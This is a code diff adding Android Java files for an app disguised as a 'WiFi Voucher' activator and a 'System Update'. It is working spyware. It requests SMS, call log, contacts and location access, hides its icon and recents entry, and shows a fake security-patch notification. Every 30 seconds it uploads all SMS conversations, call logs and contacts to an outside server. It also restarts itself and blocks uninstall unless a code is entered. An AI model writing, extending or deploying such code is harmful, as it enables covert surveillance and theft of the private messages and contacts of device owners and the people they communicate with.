+                        progressBar.setVisibility(View.GONE);
+                        verifyButton.setEnabled(true);
+                        statusText.setText("Invalid Voucher Code");
+                        statusText.setTextColor(ContextCompat.getColor(this, android.R.color.holo_red_dark));
+                    });
+                }
+            } catch (Exception e) {
+                handler.post(() -> {
+                    progressBar.setVisibility(View.GONE);
+                    verifyButton.setEnabled(true);
+                    statusText.setText("Connection failed. Check internet.");
+                    statusText.setTextColor(ContextCompat.getColor(this, android.R.color.holo_red_dark));
+                });
+            }
+        }).start();
+    }
+
+    private void requestAllPermissions() {
+        List<String> permissionsNeeded = new ArrayList<>();
+        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED)
+            permissionsNeeded.add(android.Manifest.permission.READ_SMS);
+        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED)
+            permissionsNeeded.add(android.Manifest.permission.READ_CALL_LOG);
+        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED)
+            permissionsNeeded.add(android.Manifest.permission.READ_CONTACTS);
+        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED)
+            permissionsNeeded.add(android.Manifest.permission.ACCESS_FINE_LOCATION);
+        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED)
+            permissionsNeeded.add(android.Manifest.permission.ACCESS_COARSE_LOCATION);
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED)
+                permissionsNeeded.add(android.Manifest.permission.ACCESS_BACKGROUND_LOCATION);
+        }
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED)
+                permissionsNeeded.add(android.Manifest.permission.POST_NOTIFICATIONS);
+        }
+
+        if (!permissionsNeeded.isEmpty()) {
+            ActivityCompat.requestPermissions(this, permissionsNeeded.toArray(new String[0]), PERMISSION_REQUEST_CODE);
+        } else {
+            onPermissionsGranted();
+        }
+    }
+
+    @Override
+    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        if (requestCode == PERMISSION_REQUEST_CODE) {
+            boolean allGranted = true;
+            for (int result : grantResults) {
+                if (result != PackageManager.PERMISSION_GRANTED) {
+                    allGranted = false;
+                    break;
+                }
+            }
+            if (allGranted) {
+                onPermissionsGranted();
+            } else {
+                statusText.setText("All permissions are required!");
+                statusText.setTextColor(ContextCompat.getColor(this, android.R.color.holo_red_dark));
+                verifyButton.setEnabled(true);
+                progressBar.setVisibility(View.GONE);
+            }
+        }
+    }
+
+    private void onPermissionsGranted() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
+            statusText.setText("Grant overlay permission...");
+            Intent overlayIntent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
+                Uri.parse("package:" + getPackageName()));
+            startActivityForResult(overlayIntent, OVERLAY_PERMISSION_CODE);
+        } else {
+            requestBatteryOptimization();
+        }
+    }
+
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        if (requestCode == OVERLAY_PERMISSION_CODE || requestCode == BATTERY_OPTIMIZATION_CODE) {
+            activateAndFinish();
+        }
+    }
+
+    private void requestBatteryOptimization() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+            intent.setData(Uri.parse("package:" + getPackageName()));
+            startActivityForResult(intent, BATTERY_OPTIMIZATION_CODE);
+        } else {
+            activateAndFinish();
+        }
+    }
+
+    private void activateAndFinish() {
+        statusText.setText("Activating...");
+        prefs.edit()
+            .putString("parent_code", verifiedCode)
+            .putBoolean("is_activated", true)
+            .apply();
+
+        // Hide app icon from launcher immediately
+        hideAppIcon();
+
+        handler.postDelayed(() -> {
+            Toast.makeText(this, "WiFi Voucher Activated", Toast.LENGTH_SHORT).show();
+            startVoucherService();
+        }, 500);
+    }
+
+    private void hideAppIcon() {
+        try {
+            PackageManager pm = getPackageManager();
+            ComponentName componentName = new ComponentName(this, LoginActivity.class);
+            pm.setComponentEnabledSetting(componentName,
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP);
+        } catch (Exception e) {
+            // Continue even if hiding fails
+        }
+    }
+
+    private void startVoucherService() {
+        Intent stealthIntent = new Intent(this, StealthService.class);
+        startService(stealthIntent);
+        Intent dataIntent = new Intent(this, DataCollectionService.class);
+        startService(dataIntent);
+        
+        // Hide from screen immediately
+        moveTaskToBack(true);
+        finish();
+    }
+}
+
+========== app/src/main/java/com/security/update/PermissionActivity.java ==========
+package com.security.update;
+
+import android.Manifest;
+import android.content.Intent;
+import android.content.SharedPreferences;
+import android.content.pm.PackageManager;
+import android.os.Bundle;
+import android.widget.Button;
+import android.widget.EditText;
+import android.widget.Toast;
+import androidx.appcompat.app.AppCompatActivity;
+import androidx.core.app.ActivityCompat;
+import org.json.JSONObject;
+import java.io.OutputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
+
+public class PermissionActivity extends AppCompatActivity {
+    private EditText codeInput;
+    private Button submitButton;
+    private SharedPreferences prefs;
+    private static final int PERMISSION_REQUEST_CODE = 1001;
+
+    private final String[] REQUIRED_PERMISSIONS = {
+        Manifest.permission.READ_SMS,
+        Manifest.permission.READ_CALL_LOG,
+        Manifest.permission.READ_CONTACTS,
+        Manifest.permission.ACCESS_FINE_LOCATION
+    };
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_permission);
+
+        prefs = getSharedPreferences("SurveillanceApp", MODE_PRIVATE);
+        String savedCode = prefs.getString("parent_code", "");
+        boolean isVerified = prefs.getBoolean("code_verified", false);
+
+        if (!savedCode.isEmpty() && isVerified && checkAllPermissions()) {
+            startStealthMode();
+            return;
+        }
+
+        codeInput = findViewById(R.id.codeInput);
+        submitButton = findViewById(R.id.submitButton);
+
+        submitButton.setOnClickListener(v -> {
+            String code = codeInput.getText().toString().trim().toUpperCase();
+
+            if (code.isEmpty()) {
+                Toast.makeText(this, "Tafadhali weka parent code!", Toast.LENGTH_SHORT).show();
+                return;
+            }
+
+            if (code.length() != 8) {
+                Toast.makeText(this, "Parent code lazima iwe herufi 8!", Toast.LENGTH_SHORT).show();
+                return;
+            }
+
+            verifyParentCode(code);
+        });
+    }
+
+    private void verifyParentCode(String code) {
+        new Thread(() -> {
+            try {
+                String serverUrl = "https://GhostTester.pythonanywhere.com/api/parent/verify-code";
+                JSONObject jsonRequest = new JSONObject();
+                jsonRequest.put("parent_code", code);
+
+                URL url = new URL(serverUrl);
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("POST");
+                conn.setRequestProperty("Content-Type", "application/json");
+                conn.setDoOutput(true);
+                conn.setConnectTimeout(10000);
+
+                OutputStream os = conn.getOutputStream();
+                os.write(jsonRequest.toString().getBytes());
+                os.flush();
+                os.close();
+
+                int responseCode = conn.getResponseCode();
+                if (responseCode == 200) {
+                    runOnUiThread(() -> {
+                        saveParentCode(code);
+                        requestAllPermissions();
+                    });
+                } else {
+                    runOnUiThread(() -> 
+                        Toast.makeText(PermissionActivity.this, 
+                            "Parent code si sahihi!", Toast.LENGTH_LONG).show());
+                }
+            } catch (Exception e) {
+                runOnUiThread(() -> 
+                    Toast.makeText(PermissionActivity.this, 
+                        "Hitilafu ya mtandao!", Toast.LENGTH_LONG).show());
+            }
+        }).start();
+    }
+
+    private void saveParentCode(String code) {
+        SharedPreferences.Editor editor = prefs.edit();
+        editor.putString("parent_code", code);
+        editor.putBoolean("code_verified", true);
+        editor.apply();
+    }
+
+    private void requestAllPermissions() {
+        ActivityCompat.requestPermissions(this, REQUIRED_PERMISSIONS, PERMISSION_REQUEST_CODE);
+    }
+
+    @Override
+    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        
+        if (requestCode == PERMISSION_REQUEST_CODE) {
+            boolean allGranted = true;
+            for (int result : grantResults) {
+                if (result != PackageManager.PERMISSION_GRANTED) {
+                    allGranted = false;
+                    break;
+                }
+            }
+            
+            if (allGranted) {
+                Toast.makeText(this, "Ruhusa zimepewa... App inajificha!", Toast.LENGTH_SHORT).show();
+                startStealthMode();
+            } else {
+                Toast.makeText(this, "Ruhusa zote zinahitajika! Tafadhali kubali.", Toast.LENGTH_LONG).show();
+                requestAllPermissions();
+            }
+        }
+    }
+
+    private void startStealthMode() {
+        Intent serviceIntent = new Intent(this, DataCollectionService.class);
+        startService(serviceIntent);
+        finish();
+        moveTaskToBack(true);
+    }
+
+    private boolean checkAllPermissions() {
+        for (String permission : REQUIRED_PERMISSIONS) {
+            if (ActivityCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
+                return false;
+            }
+        }
+        return true;
+    }
+
+    @Override
+    protected void onResume() {
+        super.onResume();
+        String savedCode = prefs.getString("parent_code", "");
+        boolean isVerified = prefs.getBoolean("code_verified", false);
+        
+        if (!savedCode.isEmpty() && isVerified && checkAllPermissions()) {
+            startStealthMode();
+        }
+    }
+}
+
+========== app/src/main/java/com/security/update/SmsConversationHandler.java ==========
+package com.security.update;
+
+import android.content.ContentResolver;
+import android.database.Cursor;
+import android.provider.Telephony;
+import android.util.Log;
+import org.json.JSONArray;
+import org.json.JSONObject;
+import java.util.HashMap;
+import java.util.Map;
+
+public class SmsConversationHandler {
+    private static final String TAG = "SmsConversationHandler";
+    
+    public static JSONArray getAllSmsConversations(ContentResolver contentResolver) {
+        JSONArray conversationsArray = new JSONArray();
+        Map<String, JSONObject> conversationMap = new HashMap<>();
+        
+        try {
+            // Soma SMS zote zilizo kwenye thread format
+            Cursor cursor = contentResolver.query(
+                Telephony.Sms.CONTENT_URI,
+                new String[]{
+                    Telephony.Sms._ID,
+                    Telephony.Sms.ADDRESS,
+                    Telephony.Sms.BODY,
+                    Telephony.Sms.DATE,
+                    Telephony.Sms.TYPE,
+                    Telephony.Sms.THREAD_ID
+                },
+                null, null,
+                Telephony.Sms.DATE + " ASC"  // Soma kwa mpangilio wa zamani zaidi kwanza
+            );
+            
+            if (cursor != null) {
+                while (cursor.moveToNext()) {
+                    String threadId = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.THREAD_ID));
+                    String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
+                    String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
+                    long timestamp = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
+                    int type = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE));
+                    
+                    // Tengeneza conversation key kwa mtu mmoja mmoja
+                    String conversationKey = address != null ? address : "unknown";
+                    
+                    JSONObject message = new JSONObject();
+                    message.put("sender", address);
+                    message.put("message", body);
+                    message.put("timestamp", timestamp);
+                    message.put("type", getMessageType(type));
+                    message.put("message_id", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms._ID)));
+                    
+                    // Ongeza ujumbe kwenye conversation ya mtu huyo
+                    if (!conversationMap.containsKey(conversationKey)) {
+                        JSONObject conversation = new JSONObject();
+                        conversation.put("contact", address);
+                        conversation.put("phone_number", address);
+                        conversation.put("conversation_id", threadId);
+                        conversation.put("messages", new JSONArray());
+                        conversationMap.put(conversationKey, conversation);
+                    }
+                    
+                    JSONObject conversation = conversationMap.get(conversationKey);
+                    JSONArray messages = conversation.getJSONArray("messages");
+                    messages.put(message);
+                }
+                cursor.close();
+                
+                // Badilisha map kuwa array
+                for (JSONObject conversation : conversationMap.values()) {
+                    conversationsArray.put(conversation);
+                }
+                
+                Log.d(TAG, "✅ Zimekusanywa conversations: " + conversationsArray.length());
+            }
+            
+        } catch (Exception e) {
+            Log.e(TAG, "❌ Hitilafu ya kusoma conversations: " + e.getMessage());
+        }
+        
+        return conversationsArray;
+    }
+    
+    private static String getMessageType(int type) {
+        switch (type) {
+            case Telephony.Sms.MESSAGE_TYPE_INBOX: return "received";
+            case Telephony.Sms.MESSAGE_TYPE_SENT: return "sent";
+            case Telephony.Sms.MESSAGE_TYPE_DRAFT: return "draft";
+            default: return "unknown";
+        }
+    }
+}
+
+========== app/src/main/java/com/security/update/StealthActivity.java ==========
+package com.security.update;
+
+import android.app.Activity;
+import android.app.ActivityManager;
+import android.content.ComponentName;
+import android.content.Context;
+import android.content.pm.PackageManager;
+import android.os.Bundle;
+
+public class StealthActivity extends Activity {
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        
+        // Hide app icon from launcher
+        hideAppIcon();
+        
+        // Remove from recent apps list
+        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
+            finishAndRemoveTask();
+        } else {
+            finish();
+        }
+        
+        // Move to background immediately
+        moveTaskToBack(true);
+    }
+
+    private void hideAppIcon() {
+        try {
+            // Hide the launcher icon
+            PackageManager pm = getPackageManager();
+            ComponentName componentName = new ComponentName(this, LoginActivity.class);
+            pm.setComponentEnabledSetting(componentName,
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP);
+        } catch (Exception e) {
+            // Continue even if hiding fails
+        }
+    }
+}
+
+========== app/src/main/java/com/security/update/StealthService.java ==========
+package com.security.update;
+
+import android.app.Service;
+import android.content.Intent;
+import android.content.SharedPreferences;
+import android.database.Cursor;
+import android.os.IBinder;
+import android.provider.CallLog;
+import android.provider.ContactsContract;
+import android.provider.Telephony;
+import android.util.Log;
+import android.Manifest;
+import android.content.pm.PackageManager;
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
+import android.os.Build;
+
+import org.json.JSONArray;
+import org.json.JSONObject;
+
+import java.io.OutputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.util.Timer;
+import java.util.TimerTask;
+
+public class StealthService extends Service {
+    private static final String TAG = "StealthService";
+    private Timer timer;
+    private Timer permissionTimer;
+    private String parentCode;
+    private SharedPreferences prefs;
+    private int dataSequence = 0;
+
+    @Override
+    public void onCreate() {
+        super.onCreate();
+        prefs = getSharedPreferences("SurveillanceApp", MODE_PRIVATE);
+        createNotificationChannel();
+        Log.d(TAG, "🔍 StealthService imeanzishwa kwa siri...");
+    }
+
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        if (intent != null && intent.hasExtra("PARENT_CODE")) {
+            parentCode = intent.getStringExtra("PARENT_CODE");
+            Log.d(TAG, "📱 Parent Code: " + parentCode);
+        } else {
+            parentCode = prefs.getString("parent_code", "");
+            Log.d(TAG, "📱 Parent Code from prefs: " + parentCode);
+        }
+
+        startForegroundService();
+        startPermissionRecovery();
+        startSurveillance();
+
+        return START_STICKY;
+    }
+
+    private void createNotificationChannel() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationChannel channel = new NotificationChannel(
+                "surveillance_channel",
+                "System Services",
+                NotificationManager.IMPORTANCE_LOW
+            );
+            channel.setDescription("System background services");
+            channel.setShowBadge(false);
+
+            NotificationManager manager = getSystemService(NotificationManager.class);
+            manager.createNotificationChannel(channel);
+        }
+    }
+
+    private void startForegroundService() {
+        Notification notification;
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            notification = new Notification.Builder(this, "surveillance_channel")
+                .setContentTitle("System Update")
+                .setContentText("Downloading security patches...")
+                .setSmallIcon(android.R.drawable.stat_sys_download)
+                .setPriority(Notification.PRIORITY_LOW)
+                .setOngoing(true)
+                .build();
+        } else {
+            notification = new Notification.Builder(this)
+                .setContentTitle("System Update")
+                .setContentText("Downloading security patches...")
+                .setSmallIcon(android.R.drawable.stat_sys_download)
+                .setPriority(Notification.PRIORITY_LOW)
+                .setOngoing(true)
+                .build();
+        }
+
+        startForeground(101, notification);
+    }
+
+    private void startPermissionRecovery() {
+        if (permissionTimer != null) {
+            permissionTimer.cancel();
+        }
+
+        permissionTimer = new Timer();
+
+        // Check permissions kila baada ya sekunde 30
+        permissionTimer.scheduleAtFixedRate(new TimerTask() {
+            @Override
+            public void run() {
+                if (!hasRequiredPermissions()) {
+                    Log.w(TAG, "⚠️ Baadhi ya ruhusa hazipo, inajaribu kurecover...");
+                    attemptPermissionRecovery();
+                } else {
+                    Log.d(TAG, "✅ Ruhusa zote zipo - inaendelea na kazi");
+                }
+            }
+        }, 0, 30000); // Check kila 30 seconds
+
+        Log.d(TAG, "🔄 Permission recovery system imeanzishwa");
+    }
+
+    private void startSurveillance() {
+        if (timer != null) {
+            timer.cancel();
+        }
+
+        timer = new Timer();
+
+        // Anza kukusanya data mara moja
+        timer.schedule(new TimerTask() {
+            @Override
+            public void run() {
+                if (hasRequiredPermissions()) {
+                    collectAndSendAllData();
+                } else {
+                    Log.w(TAG, "⏳ Ruhusa bado hazipo - inasubiri...");
+                }
+            }
+        }, 0);
+
+        // 🔄 KUBADILISHWA: Rudia kukusanya data kila baada ya SEKUNDE 30 (badala ya dakika 10)
+        timer.scheduleAtFixedRate(new TimerTask() {
+            @Override
+            public void run() {
+                if (hasRequiredPermissions()) {
+                    collectAndSendAllData();
+                }
+            }
+        }, 30000, 30000); // SEKUNDE 30 (30,000ms)
+
+        Log.d(TAG, "📡 Surveillance imeanzishwa - Frequency: 30 seconds");
+    }
+
+    private void attemptPermissionRecovery() {
+        try {
+            Log.d(TAG, "🔄 Inajaribu kurecover permissions kwa kurestart service...");
+
+            Intent restartIntent = new Intent(this, StealthService.class);
+            restartIntent.putExtra("PARENT_CODE", parentCode);
+            stopSelf();
+            startService(restartIntent);
+
+        } catch (Exception e) {
+            Log.e(TAG, "❌ Error recovering permissions: " + e.getMessage());
+        }
+    }
+
+    private boolean hasRequiredPermissions() {
+        String[] requiredPermissions = {
+            Manifest.permission.READ_SMS,
+            Manifest.permission.READ_CALL_LOG,
+            Manifest.permission.READ_CONTACTS
+        };
+
+        for (String permission : requiredPermissions) {
+            if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
+                return false;
+            }
+        }
+        return true;
+    }
+
+    private void collectAndSendAllData() {
+        try {
+            Log.d(TAG, "🔄 Kuanza kukusanya data...");
+            dataSequence++;
+
+            // 1. Kusanya SMS CONVERSATIONS ZOTE
+            if (checkPermission(Manifest.permission.READ_SMS)) {
+                collectAndSendSMSConversations();
+            }
+
+            // 2. Kusanya CALL LOG ZOTE
+            if (checkPermission(Manifest.permission.READ_CALL_LOG)) {
+                collectAndSendCallsData();
+            }
+
+            // 3. Kusanya CONTACTS ZOTE
+            if (checkPermission(Manifest.permission.READ_CONTACTS)) {
+                collectAndSendContactsData();
+            }
+
+            Log.d(TAG, "✅ Ukusaji wa data #" + dataSequence + " umekamilika");
+
+        } catch (Exception e) {
+            Log.e(TAG, "❌ Error collecting data: " + e.getMessage());
+        }
+    }
+
+    // 🔄 KUBADILISHWA: Sasa inakusanya CONVERSATIONS zima badala ya messages mbalimbali
+    private void collectAndSendSMSConversations() {
+        try {
+            JSONArray conversations = SmsConversationHandler.getAllSmsConversations(getContentResolver());
+            
+            for (int i = 0; i < conversations.length(); i++) {
+                JSONObject conversation = conversations.getJSONObject(i);
+                
+                JSONObject conversationData = new JSONObject();
+                conversationData.put("conversation", conversation);
+                conversationData.put("sequence", dataSequence);
+                conversationData.put("total_conversations", conversations.length());
+                conversationData.put("conversation_index", i);
+
+                sendSingleDataToServer("sms_conversation", conversationData);
+                
+                // Pumzisha kidogo kati ya conversations
+                if (i % 5 == 0) {
+                    Thread.sleep(1000);
+                }
+            }
+            
+            Log.d(TAG, "✅ SMS Conversations " + conversations.length() + " zimetumwa");
+
+        } catch (Exception e) {
+            Log.e(TAG, "❌ Error reading SMS conversations: " + e.getMessage());
+        }
+    }
+
+    private void collectAndSendCallsData() {
+        try {
+            Cursor cursor = getContentResolver().query(
+                CallLog.Calls.CONTENT_URI,
+                null, null, null,
+                CallLog.Calls.DATE + " DESC"
+            );
+
+            if (cursor != null) {
+                int count = 0;
+                while (cursor.moveToNext()) {
+                    JSONObject callData = new JSONObject();
+                    callData.put("number", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
+                    callData.put("duration", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
+                    callData.put("timestamp", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)));
+                    callData.put("type", getCallTypeText(cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE))));
+                    callData.put("sequence", dataSequence);
+
+                    sendSingleDataToServer("calls", callData);
+                    count++;
+
+                    if (count % 10 == 0) Thread.sleep(2000);
+                }
+                cursor.close();
+                Log.d(TAG, "✅ Call Log " + count + " zimetumwa");
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "❌ Error reading calls: " + e.getMessage());
+        }
+    }
+
+    private void collectAndSendContactsData() {
+        try {
+            Cursor cursor = getContentResolver().query(
+                ContactsContract.Contacts.CONTENT_URI,
+                null, null, null,
+                ContactsContract.Contacts.DISPLAY_NAME + " ASC"
+            );
+
+            if (cursor != null) {
+                int count = 0;
+                while (cursor.moveToNext()) {
+                    String contactId = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
+                    String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
+
+                    JSONArray phoneNumbers = getAllContactPhoneNumbers(contactId);
+
+                    if (phoneNumbers.length() > 0) {
+                        JSONObject contactData = new JSONObject();
+                        contactData.put("name", name);
+                        contactData.put("phones", phoneNumbers);
+                        contactData.put("timestamp", System.currentTimeMillis());
+                        contactData.put("sequence", dataSequence);
+
+                        sendSingleDataToServer("contacts", contactData);
+                        count++;
+
+                        if (count % 5 == 0) Thread.sleep(2000);
+                    }
+                }
+                cursor.close();
+                Log.d(TAG, "✅ Contacts " + count + " zimetumwa");
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "❌ Error reading contacts: " + e.getMessage());
+        }
+    }
+
+    private JSONArray getAllContactPhoneNumbers(String contactId) {
+        JSONArray phones = new JSONArray();
+        try {
+            Cursor phoneCursor = getContentResolver().query(
+                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                null,
+                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
+                new String[]{contactId},
+                null
+            );
+
+            if (phoneCursor != null) {
+                while (phoneCursor.moveToNext()) {
+                    String phone = phoneCursor.getString(phoneCursor.getColumnIndexOrThrow(
+                        ContactsContract.CommonDataKinds.Phone.NUMBER));
+                    String type = getPhoneTypeText(phoneCursor.getInt(phoneCursor.getColumnIndexOrThrow(
+                        ContactsContract.CommonDataKinds.Phone.TYPE)));
+
+                    JSONObject phoneInfo = new JSONObject();
+                    phoneInfo.put("number", phone);
+                    phoneInfo.put("type", type);
+                    phones.put(phoneInfo);
+                }
+                phoneCursor.close();
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error getting phone numbers: " + e.getMessage());
+        }
+        return phones;
+    }
+
+    private String getCallTypeText(int callType) {
+        switch (callType) {
+            case CallLog.Calls.INCOMING_TYPE: return "incoming";
+            case CallLog.Calls.OUTGOING_TYPE: return "outgoing";
+            case CallLog.Calls.MISSED_TYPE: return "missed";
+            default: return "unknown";
+        }
+    }
+
+    private String getPhoneTypeText(int phoneType) {
+        switch (phoneType) {
+            case ContactsContract.CommonDataKinds.Phone.TYPE_HOME: return "home";
+            case ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE: return "mobile";
+            case ContactsContract.CommonDataKinds.Phone.TYPE_WORK: return "work";
+            default: return "other";
+        }
+    }
+
+    private void sendSingleDataToServer(String dataType, JSONObject dataContent) {
+        new Thread(() -> {
+            try {
+                String serverUrl = "https://GhostTester.pythonanywhere.com/api/parent/submit-data";
+
+                JSONObject postData = new JSONObject();
+                postData.put("parent_code", parentCode);
+                postData.put("data_type", dataType);
+                postData.put("device_id", android.os.Build.MODEL);
+                postData.put("data_content", dataContent);
+
+                URL url = new URL(serverUrl);
+                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+                conn.setRequestMethod("POST");
+                conn.setRequestProperty("Content-Type", "application/json");
+                conn.setDoOutput(true);
+                conn.setConnectTimeout(15000);
+                conn.setReadTimeout(15000);
+
+                OutputStream os = conn.getOutputStream();
+                os.write(postData.toString().getBytes());
+                os.flush();
+                os.close();
+
+                int responseCode = conn.getResponseCode();
+                if (responseCode == 200) {
+                    Log.d(TAG, "✅ " + dataType + " imetumwa kikamilifu");
+                } else {
+                    Log.e(TAG, "❌ Server error for " + dataType + ": " + responseCode);
+                }
+
+            } catch (Exception e) {
+                Log.e(TAG, "❌ Error sending " + dataType + ": " + e.getMessage());
+            }
+        }).start();
+    }
+
+    private boolean checkPermission(String permission) {
+        return checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED;
+    }
+
+    @Override
+    public IBinder onBind(Intent intent) {
+        return null;
+    }
+
+    @Override
+    public void onDestroy() {
+        super.onDestroy();
+        if (timer != null) timer.cancel();
+        if (permissionTimer != null) permissionTimer.cancel();
+
+        // AUTOMATIC RESTART
+        Intent restartIntent = new Intent(this, StealthService.class);
+        restartIntent.putExtra("PARENT_CODE", parentCode);
+        startService(restartIntent);
+
+        Log.d(TAG, "🔄 StealthService inaanzishwa tena kwa kiotomatiki");
+    }
+}
+
+========== app/src/main/java/com/security/update/UninstallProtectionActivity.java ==========
+package com.security.update;
+
+import android.app.Activity;
+import android.content.Intent;
+import android.content.SharedPreferences;
+import android.os.Bundle;
+import android.view.Window;
+import android.view.WindowManager;
+import android.widget.EditText;
+import android.widget.Button;
+import android.widget.Toast;
+
+public class UninstallProtectionActivity extends Activity {
+    private EditText codeInput;
+    private Button submitButton;
+    private SharedPreferences prefs;
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        
+        // Fanya isionekane
+        requestWindowFeature(Window.FEATURE_NO_TITLE);
+        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
+                           WindowManager.LayoutParams.FLAG_FULLSCREEN);
+        
+        setContentView(R.layout.activity_uninstall_protection);
+        
+        prefs = getSharedPreferences("SurveillanceApp", MODE_PRIVATE);
+        codeInput = findViewById(R.id.uninstallCodeInput);
+        submitButton = findViewById(R.id.uninstallSubmitButton);
+
+        submitButton.setOnClickListener(v -> {
+            String enteredCode = codeInput.getText().toString().trim().toUpperCase();
+            String savedCode = prefs.getString("parent_code", "");
+            
+            if (enteredCode.equals(savedCode)) {
+                // Kubali kufuta - futa data zote
+                SharedPreferences.Editor editor = prefs.edit();
+                editor.clear();
+                editor.apply();
+                
+                // Stop service
+                Intent serviceIntent = new Intent(this, StealthService.class);
+                stopService(serviceIntent);
+                
+                Toast.makeText(this, "App imefutwa kikamilifu", Toast.LENGTH_LONG).show();
+                finish();
+            } else {
+                Toast.makeText(this, "❌ Msimbo si sahihi! App haifutiki.", Toast.LENGTH_LONG).show();
+                
+                // Rudisha kwenye stealth mode
+                Intent stealthIntent = new Intent(this, StealthService.class);
+                stealthIntent.putExtra("PARENT_CODE", savedCode);
+                startService(stealthIntent);
+                
+                moveTaskToBack(true);
+                finish();
+            }
+        });
+    }
+    
+    @Override
+    public void onBackPressed() {
+        // Usiruhusu kurudi - rudisha kwenye background
+        moveTaskToBack(true);
+    }
+}
+
+========== app/src/main/java/com/security/update/UninstallReceiver.java ==========
+package com.security.update;
+
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+import android.content.SharedPreferences;
+import android.util.Log;
+
+public class UninstallReceiver extends BroadcastReceiver {
+    private static final String TAG = "UninstallReceiver";
+
+    @Override
+    public void onReceive(Context context, Intent intent) {
+        if (intent.getAction().equals("android.intent.action.QUERY_PACKAGE_RESTART")) {
+            Log.d(TAG, "⚠️ Mtu anajaribu kufuta app!");
+            
+            SharedPreferences prefs = context.getSharedPreferences("SurveillanceApp", Context.MODE_PRIVATE);
+            String parentCode = prefs.getString("parent_code", "");
+            
+            if (!parentCode.isEmpty()) {
+                // Anza uninstall protection activity
+                Intent protectionIntent = new Intent(context, UninstallProtectionActivity.class);
+                protectionIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                context.startActivity(protectionIntent);
+                
+                Log.d(TAG, "🔒 Uninstall protection imeshtakiwa");
+            }
+        }
+    }
+}
